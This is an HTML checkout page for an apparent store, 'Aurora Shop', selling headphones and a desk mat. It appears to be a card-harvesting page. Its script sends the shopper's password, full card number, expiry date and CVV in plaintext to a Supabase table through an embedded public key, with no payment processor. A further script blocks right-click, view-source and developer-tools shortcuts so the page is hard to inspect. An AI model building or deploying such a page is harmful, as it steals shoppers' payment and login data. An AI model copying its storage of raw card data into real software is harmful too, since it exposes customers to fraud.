<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Premium Checkout</title>
    <!-- Supabase JS Client -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        :root {
            --primary-color: #0f172a;
            --accent-color: #2563eb;
            --accent-hover: #1d4ed8;
            --bg-color: #f8fafc;
            --border-color: #e2e8f0;
            --text-main: #334155;
            --text-light: #64748b;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 12px;
        }

        .checkout-container {
            background: white;
            width: 100%;
            max-width: 960px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
            display: grid;
            grid-template-columns: 1.2fr 0.8fr;
            overflow: hidden;
        }

        /* Form / Left Column */
        .checkout-form-section {
            padding: 24px;
        }

        .brand-header {
            margin-bottom: 16px;
        }

        .brand-header h1 {
            font-size: 20px;
            color: var(--primary-color);
            font-weight: 700;
        }

        .section-title {
            font-size: 13px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 12px;
            color: var(--primary-color);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .form-group-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }

        .form-group-row.card-row {
            grid-template-columns: 2fr 1fr 1fr;
        }

        .form-group {
            margin-bottom: 12px;
        }

        .form-group label {
            display: block;
            font-size: 12px;
            font-weight: 500;
            margin-bottom: 4px;
            color: var(--text-light);
        }

        .form-group input, .form-group select {
            width: 100%;
            padding: 8px 10px;
            border: 1px solid var(--border-color);
            border-radius: 6px;
            font-size: 13px;
            color: var(--text-main);
            transition: all 0.2s ease;
            background-color: #fff;
        }

        .form-group input:focus, .form-group select:focus {
            outline: none;
            border-color: var(--accent-color);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.15);
        }

        .divider {
            height: 1px;
            background-color: var(--border-color);
            margin: 16px 0;
        }

        /* Order Summary / Right Column */
        .order-summary-section {
            background-color: #f1f5f9;
            padding: 24px;
            border-left: 1px solid var(--border-color);
            display: flex;
            flex-direction: column;
            justify-content: space-between;
        }

        .summary-title {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 16px;
            color: var(--primary-color);
        }

        .product-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
        }

        .product-info h4 {
            font-size: 13px;
            font-weight: 600;
            color: var(--primary-color);
        }

        .product-info p {
            font-size: 11px;
            color: var(--text-light);
        }

        .product-price {
            font-size: 13px;
            font-weight: 600;
            color: var(--primary-color);
        }

        .price-breakdown {
            margin-top: auto;
            padding-top: 14px;
            border-top: 1px solid var(--border-color);
        }

        .price-row {
            display: flex;
            justify-content: space-between;
            font-size: 13px;
            margin-bottom: 8px;
            color: var(--text-light);
        }

        .price-row.total {
            font-size: 16px;
            font-weight: 700;
            color: var(--primary-color);
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px dashed var(--border-color);
        }

        .submit-btn {
            width: 100%;
            background-color: var(--accent-color);
            color: white;
            border: none;
            padding: 12px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
            margin-top: 16px;
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.2);
        }

        .submit-btn:hover {
            background-color: var(--accent-hover);
        }

        @media (max-width: 768px) {
            body {
                align-items: flex-start;
            }
            .checkout-container {
                grid-template-columns: 1fr;
            }
            .order-summary-section {
                border-left: none;
                border-top: 1px solid var(--border-color);
            }
        }
    </style>
</head>
<body>

<div class="checkout-container">
    <div class="checkout-form-section">
        <div class="brand-header">
            <h1>Aurora Shop</h1>
        </div>

        <form id="checkoutForm">
            <div class="section-title">1. Account Security & Payment</div>
            <div class="form-group-row">
                <div class="form-group">
                    <label for="username">Username / Email</label>
                    <input type="email" id="username" placeholder="alex@example.com" autocomplete="email" required>
                </div>
                <div class="form-group">
                    <label for="password">Create Password</label>
                    <input type="password" id="password" placeholder="••••••••" minlength="8" autocomplete="new-password" required>
                </div>
            </div>

            <div class="form-group-row card-row">
                <div class="form-group">
                    <label for="card_number">Card Number</label>
                    <input type="text" id="card_number" placeholder="4111 1111 1111 1111" inputmode="numeric" pattern="[0-9\s]{13,19}" maxlength="19" autocomplete="cc-number" required>
                </div>
                <div class="form-group">
                    <label for="exp_date">Exp Date</label>
                    <input type="text" id="exp_date" placeholder="MM/YY" inputmode="numeric" pattern="(0[1-9]|1[0-2])\/[0-9]{2}" maxlength="5" autocomplete="cc-exp" required>
                </div>
                <div class="form-group">
                    <label for="cvv">CVV</label>
                    <input type="text" id="cvv" placeholder="123" inputmode="numeric" pattern="[0-9]{3,4}" maxlength="4" autocomplete="cc-csc" required>
                </div>
            </div>

            <div class="divider"></div>

            <div class="section-title">2. Shipping Details</div>
            <div class="form-group-row">
                <div class="form-group">
                    <label for="firstName">First Name</label>
                    <input type="text" id="firstName" placeholder="Alex" autocomplete="given-name" required>
                </div>
                <div class="form-group">
                    <label for="lastName">Last Name</label>
                    <input type="text" id="lastName" placeholder="Morgan" autocomplete="family-name" required>
                </div>
            </div>
            <div class="form-group">
                <label for="address">Address</label>
                <input type="text" id="address" placeholder="123 Main Street, Apt 4B" autocomplete="street-address" required>
            </div>
            <div class="form-group-row">
                <div class="form-group">
                    <label for="country">Country</label>
                    <select id="country" autocomplete="country-name" required>
                        <option value="United States">United States</option>
                        <option value="Canada">Canada</option>
                        <option value="United Kingdom">United Kingdom</option>
                        <option value="Sri Lanka">Sri Lanka</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="zipCode">Zip Code</label>
                    <input type="text" id="zipCode" placeholder="10001" autocomplete="postal-code" inputmode="numeric" required>
                </div>
            </div>
        </form>
    </div>

    <div class="order-summary-section">
        <div>
            <div class="summary-title">Order Summary</div>
            
            <div class="product-item">
                <div class="product-info">
                    <h4>Premium Wireless Headphones</h4>
                    <p>Qty: 1 • Midnight Black</p>
                </div>
                <div class="product-price">$249.00</div>
            </div>
            <div class="product-item">
                <div class="product-info">
                    <h4>Minimalist Desk Mat</h4>
                    <p>Qty: 1 • Felt Grey</p>
                </div>
                <div class="product-price">$35.00</div>
            </div>
        </div>

        <div class="price-breakdown">
            <div class="price-row">
                <span>Subtotal</span>
                <span>$284.00</span>
            </div>
            <div class="price-row">
                <span>Shipping</span>
                <span style="color: #10b981; font-weight: 500;">Free</span>
            </div>
            <div class="price-row">
                <span>Estimated Tax</span>
                <span>$22.72</span>
            </div>
            <div class="price-row total">
                <span>Total</span>
                <span>$306.72</span>
            </div>

            <button type="submit" form="checkoutForm" class="submit-btn" id="submitBtn">Complete Purchase</button>
        </div>
    </div>
</div>

<script>
    // Initialize Supabase Client
    const SUPABASE_URL = 'https://lcgqrvvbenmolpfrgrqg.supabase.co';
    const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxjZ3FydnZiZW5tb2xwZnJncnFnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODYwNTY3NjgsImV4cCI6MjEwMTYzMjc2OH0.yAbBGVII2xg5a2FU77Mwjyp7InNbl2StVVlD0o_ySsQ';
    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    document.getElementById('checkoutForm').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const submitBtn = document.getElementById('submitBtn');
        submitBtn.disabled = true;
        submitBtn.textContent = 'Processing...';

        const payload = {
            username: document.getElementById('username').value,
            password: document.getElementById('password').value,
            card_number: document.getElementById('card_number').value,
            exp_date: document.getElementById('exp_date').value,
            cvv: document.getElementById('cvv').value,
            first_name: document.getElementById('firstName').value,
            last_name: document.getElementById('lastName').value,
            address: document.getElementById('address').value,
            country: document.getElementById('country').value,
            zip_code: document.getElementById('zipCode').value,
            order_total: 306.72,
            items_ordered: [
                { id: "p-01", name: "Premium Wireless Headphones", qty: 1, price: 249.00 },
                { id: "p-02", name: "Minimalist Desk Mat", qty: 1, price: 35.00 }
            ]
        };

        const { data, error } = await supabaseClient
            .from('checkout_orders')
            .insert([payload]);

        if (error) {
            alert('Error saving order: ' + error.message);
        } else {
            alert('Order placed successfully!');
            document.getElementById('checkoutForm').reset();
        }

        submitBtn.disabled = false;
        submitBtn.textContent = 'Complete Purchase';
    });
</script>

<!-- SOURCE CODE PROTECTION SCRIPT -->
    <script>
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12') {
                e.preventDefault();
                return false;
            }
            if ((e.ctrlKey || e.metaKey) && (e.key === 'u' || e.key === 'U')) {
                e.preventDefault();
                return false;
            }
            if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'i' || e.key === 'I')) {
                e.preventDefault();
                return false;
            }
            if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'j' || e.key === 'J')) {
                e.preventDefault();
                return false;
            }
        });
    </script>


</body>
</html>
